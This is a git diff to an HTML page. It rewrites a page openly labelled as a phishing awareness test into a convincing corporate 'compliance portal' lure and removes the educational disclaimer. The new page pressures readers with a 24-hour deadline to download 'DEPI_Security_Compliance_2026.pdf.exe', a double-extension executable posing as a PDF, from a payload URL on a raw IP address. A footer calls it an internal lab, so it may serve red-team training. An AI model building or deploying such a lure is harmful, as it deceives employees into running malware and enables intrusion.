@@ -3,24 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Awareness Training | SOC Simulation</title>
+    <title>DEPI Corporate Compliance & Policy Portal</title>
     
-    <!-- Google Fonts: Inter for clean enterprise typography -->
+    <!-- Google Fonts: Inter for enterprise typography -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
     <style>
         :root {
-            --bg-color: #0d1117;
-            --card-bg: rgba(22, 27, 34, 0.75);
-            --card-border: rgba(255, 255, 255, 0.1);
-            --primary-blue: #2f81f7;
-            --primary-hover: #1f6beb;
-            --text-main: #f0f6fc;
-            --text-muted: #8b949e;
-            --success-green: #238636;
-            --accent-glow: rgba(47, 129, 247, 0.15);
+            --bg-color: #f1f5f9;
+            --card-bg: #ffffff;
+            --primary-blue: #0284c7;
+            --primary-hover: #0369a1;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --border-color: #e2e8f0;
+            --badge-bg: #e0f2fe;
+            --badge-text: #0369a1;
         }
 
         * {
@@ -35,129 +35,136 @@
             color: var(--text-main);
             min-height: 100vh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+            justify-content: space-between;
             align-items: center;
-            position: relative;
-            overflow: hidden;
+            padding: 20px;
         }
 
-        /* Animated Ambient Background Glows */
-        body::before, body::after {
-            content: '';
-            position: absolute;
-            width: 350px;
-            height: 350px;
-            border-radius: 50%;
-            filter: blur(100px);
-            z-index: 0;
-            animation: floatGlow 10s infinite alternate ease-in-out;
+        /* Top Enterprise Navigation Header */
+        .portal-header {
+            width: 100%;
+            max-width: 520px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 20px;
         }
 
-        body::before {
-            background: rgba(47, 129, 247, 0.2);
-            top: 15%;
-            left: 20%;
-        }
-
-        body::after {
-            background: rgba(35, 134, 54, 0.15);
-            bottom: 15%;
-            right: 20%;
-            animation-delay: -5s;
-        }
-
-        @keyframes floatGlow {
-            0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(30px, -30px) scale(1.1); }
-        }
-
-        /* Card Container */
-        .card {
-            position: relative;
-            z-index: 1;
-            background: var(--card-bg);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid var(--card-border);
-            border-radius: 16px;
-            padding: 40px;
-            max-width: 440px;
-            width: 90%;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5),
-                        0 0 40px var(--accent-glow);
-            text-align: center;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6),
-                        0 0 50px var(--accent-glow);
-        }
-
-        /* Security Badge Header */
-        .shield-icon {
-            width: 64px;
-            height: 64px;
-            background: rgba(47, 129, 247, 0.1);
-            border-radius: 50%;
+        .corp-brand {
+            font-weight: 700;
+            font-size: 1.05rem;
+            color: #1e293b;
             display: flex;
             align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            color: var(--primary-blue);
-            border: 1px solid rgba(47, 129, 247, 0.3);
-        }
-
-        /* Live Status Indicator */
-        .status-pill {
-            display: inline-flex;
-            align-items: center;
             gap: 8px;
-            background: rgba(35, 134, 54, 0.15);
-            color: #3fb950;
-            border: 1px solid rgba(63, 185, 80, 0.3);
+        }
+
+        .corp-brand span {
+            color: var(--primary-blue);
+        }
+
+        .sys-status {
             font-size: 0.75rem;
-            font-weight: 600;
-            padding: 4px 12px;
-            border-radius: 20px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 16px;
+            color: #047857;
+            background: #ecfdf5;
+            border: 1px solid #a7f3d0;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-weight: 500;
         }
 
-        .pulse-dot {
-            width: 8px;
-            height: 8px;
-            background-color: #3fb950;
-            border-radius: 50%;
-            box-shadow: 0 0 8px #3fb950;
-            animation: pulse 2s infinite;
+        /* Main Content Card */
+        .main-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 35px;
+            max-width: 520px;
+            width: 100%;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
         }
 
-        @keyframes pulse {
-            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(63, 185, 80, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(63, 185, 80, 0); }
-            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(63, 185, 80, 0); }
+        /* Urgent Notice Banner inside Card */
+        .notice-banner {
+            background: #fffbeb;
+            border: 1px solid #fef3c7;
+            border-left: 4px solid #f59e0b;
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin-bottom: 24px;
+            font-size: 0.825rem;
+            color: #92400e;
+            line-height: 1.5;
+        }
+
+        .notice-banner strong {
+            color: #78350f;
+            display: block;
+            margin-bottom: 2px;
         }
 
         h2 {
-            font-size: 1.5rem;
+            font-size: 1.25rem;
             font-weight: 700;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             color: var(--text-main);
-            letter-spacing: -0.02em;
         }
 
         p.description {
             color: var(--text-muted);
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             line-height: 1.6;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
         }
 
-        /* Action Button */
-        .btn-primary {
+        /* Document Item Box */
+        .document-box {
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .doc-meta {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .doc-icon {
+            width: 40px;
+            height: 40px;
+            background: #e0f2fe;
+            color: var(--primary-blue);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.8rem;
+        }
+
+        .doc-details h4 {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 2px;
+        }
+
+        .doc-details span {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        /* Action Download Button */
+        .btn-action {
             display: flex;
             align-items: center;
             justify-content: center;
@@ -165,92 +172,80 @@
             width: 100%;
             background-color: var(--primary-blue);
             color: #ffffff;
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             font-weight: 600;
-            padding: 14px 24px;
-            border-radius: 8px;
+            padding: 12px 20px;
+            border-radius: 6px;
             text-decoration: none;
-            transition: all 0.2s ease-in-out;
-            box-shadow: 0 4px 12px rgba(47, 129, 247, 0.3);
+            transition: background-color 0.2s ease;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
-        .btn-primary:hover {
+        .btn-action:hover {
             background-color: var(--primary-hover);
-            transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(47, 129, 247, 0.4);
         }
 
-        .btn-primary svg {
-            transition: transform 0.2s ease;
-        }
-
-        .btn-primary:hover svg {
-            transform: translateX(3px);
-        }
-
-        /* Educational Safeguard Note */
-        .educational-banner {
-            margin-top: 28px;
-            padding-top: 20px;
-            border-top: 1px solid var(--card-border);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
+        /* Enterprise Footer */
+        .portal-footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.75rem;
             color: var(--text-muted);
-            font-size: 0.8rem;
-        }
-
-        .educational-banner svg {
-            color: #3fb950;
-            flex-shrink: 0;
+            line-height: 1.5;
+            max-width: 520px;
         }
     </style>
 </head>
-
 <body>
 
-    <div class="card">
-        <!-- Security Icon Header -->
-        <div class="shield-icon">
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-                <path d="m9 12 2 2 4-4"/>
-            </svg>
+    <!-- Header -->
+    <div class="portal-header">
+        <div class="corp-brand">
+            DEPI <span>Enterprise Portal</span>
+        </div>
+        <div class="sys-status">
+            ● Secure Internal Domain
+        </div>
+    </div>
+
+    <!-- Main Card -->
+    <div class="main-card">
+        
+        <!-- Mandatory Action Warning -->
+        <div class="notice-banner">
+            <strong>Action Required: Q1 Compliance Verification</strong>
+            All active domain users must download, review, and acknowledge the updated remote network security protocols within 24 hours.
         </div>
 
-        <!-- Status Badge -->
-        <div class="status-pill">
-            <span class="pulse-dot"></span>
-            SOC Awareness Exercise
-        </div>
-
-        <h2>Phishing Simulation Test</h2>
+        <h2>Mandatory IT Security & Compliance Directive</h2>
 
         <p class="description">
-            This interaction is part of an officially authorized security training program designed to enhance organizational threat awareness.
+            In accordance with recent infrastructure updates and corporate security governance, please access the official compliance directive document below to maintain active domain privileges.
         </p>
 
-        <!-- Main Action Button -->
-        <a class="btn-primary" 
-           href="https://www.facebook.com/" 
-           target="_blank" 
-           rel="noopener noreferrer">
-            <span>Proceed to Facebook</span>
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <line x1="5" y1="12" x2="19" y2="12"></line>
-                <polyline points="12 5 19 12 12 19"></polyline>
-            </svg>
+        <!-- Document Preview Box -->
+        <div class="document-box">
+            <div class="doc-meta">
+                <div class="doc-icon">PDF</div>
+                <div class="doc-details">
+                    <h4>DEPI_Security_Compliance_2026.pdf.exe</h4>
+                    <span>Official Directive • Ver. 4.2 (Secure Release)</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Download Link (Redirects to Payload/Simulation Endpoint) -->
+        <a class="btn-action" href="http://100.71.122.23/payload-download" target="_blank" rel="noopener noreferrer">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+            <span>Download & Review Directive</span>
         </a>
 
-        <!-- Educational Disclaimer -->
-        <div class="educational-banner">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-            </svg>
-            <span>Safe & Confidential — No credentials are logged or saved.</span>
-        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="portal-footer">
+        DEPI Enterprise Security Operations Center &bull; Internal Lab Environment<br>
+        Authorized Network Access Only &bull; All interactions are monitored and logged.
     </div>
 
 </body>
